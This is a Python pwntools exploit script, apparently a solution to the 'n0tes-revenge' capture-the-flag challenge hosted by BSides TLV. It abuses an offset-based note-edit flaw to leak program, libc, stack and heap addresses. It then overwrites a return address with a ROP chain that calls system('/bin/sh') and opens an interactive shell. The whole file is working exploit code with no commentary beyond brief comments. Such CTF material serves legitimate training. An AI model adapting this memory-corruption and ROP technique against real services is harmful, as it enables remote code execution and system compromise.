#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.update(arch="amd64",os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('n0tes-revenge')
libc = ELF('libc.so.6')

if args.REMOTE:
  host, port = "n0tes-revenge.ctf.bsidestlv.com", "9999"
else:
  host, port = "127.0.0.1", "8080"

p = remote(host,port)

def add(data):
  sla('>> ', '1')
  sla('Content: ', data)

def edit(offset,data):
  sla('>> ', '2')
  sla('Offset: ', str(offset))
  sa('): ', data)

# edit and return leak
def editl(offset,data):
  sla('>> ', '2')
  sla('Offset: ', str(offset))
  p.recvuntil('----\n', drop=True)
  buff = p.recv(16)
  sa('): ', data)
  return buff

sla('>> ', '4')
exe.address = int(rcu('@',']'),16)-0x11f9
logleak('prog base', exe.address)

add('A')

libc.address = u64(editl(215576,b'\x0a')[0:8]) - libc.sym['malloc']
logbase()

# leak stack value
stack = u64(editl(0x34a48 ,b'\x0a')[0:8])
logleak('stack', stack)
# calculate chunks mapping address
chunks = u64(editl(0x339f0 ,b'\x0a')[0:8]) - 0x2bd5e
logleak('chunks', chunks)

# copy payload to edit function stack return address (in two round
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
payload = p64(ret)+p64(libc.sym['system'])
edit((stack-0x118)-chunks, payload)
# ok we got shell after edit
payload = p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
edit((stack-0x128)-chunks, payload)

p.interactive()
